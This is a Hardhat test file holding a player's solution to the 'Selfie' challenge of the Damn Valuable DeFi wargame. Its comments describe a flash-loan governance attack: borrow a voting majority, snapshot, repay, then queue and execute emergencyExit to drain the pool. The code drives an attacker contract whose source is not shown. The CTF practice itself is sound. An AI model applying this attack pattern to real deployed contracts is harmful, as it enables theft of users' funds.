const { ethers } = require('hardhat');
const { expect } = require('chai');
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Selfie', function () {
    let deployer, player;
    let token, governance, pool;

    const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
    const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token Snapshot
        token = await (await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer)).deploy(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = await (await ethers.getContractFactory('SimpleGovernance', deployer)).deploy(token.address);
        expect(await governance.getActionCounter()).to.eq(1);

        // Deploy the pool
        pool = await (await ethers.getContractFactory('SelfiePool', deployer)).deploy(
            token.address,
            governance.address    
        );
        expect(await pool.token()).to.eq(token.address);
        expect(await pool.governance()).to.eq(governance.address);
        
        // Fund the pool
        await token.transfer(pool.address, TOKENS_IN_POOL);
        await token.snapshot();
        expect(await token.balanceOf(pool.address)).to.be.equal(TOKENS_IN_POOL);
        expect(await pool.maxFlashLoan(token.address)).to.eq(TOKENS_IN_POOL);
        expect(await pool.flashFee(token.address, 0)).to.eq(0);

    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        /** Attempt 1
         * `SelfiePool` has an `emergencyExit` function that lets the governance address withdraw all tokens.
         * I need to execute this function from the governance contract.
         * To execute something via the Governance contract, I need to `_hasEnoughVotes`, but at the last snapshot.
         * The gov, uses `SelfiePool`'s flash loan token for governance. And the token let's anyone create a snapshot.
         * 
         * The attack:
         *  1. Get a flashloan, amount > half of total
         *  2. Create a snapshot.
         *  3. Send the tokens back (flash loan over now).
         *  4. Use the recorded snapshot to execute the `emergencyExit` to my player.
         *      1. `queueAction` the emergency exit.
         *      2. Fast forward two days.
         *      3. `executeAction`.
         */
        
        const attacker = await (await ethers.getContractFactory('AttackSelfie', player)).deploy(
            pool.address,
            governance.address,
            token.address
        );
        await attacker.attack();
        await ethers.provider.send("evm_increaseTime", [6 * 24 * 60 * 60]); // 6 days
        await attacker.executeAttack(1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(0);
    });
});
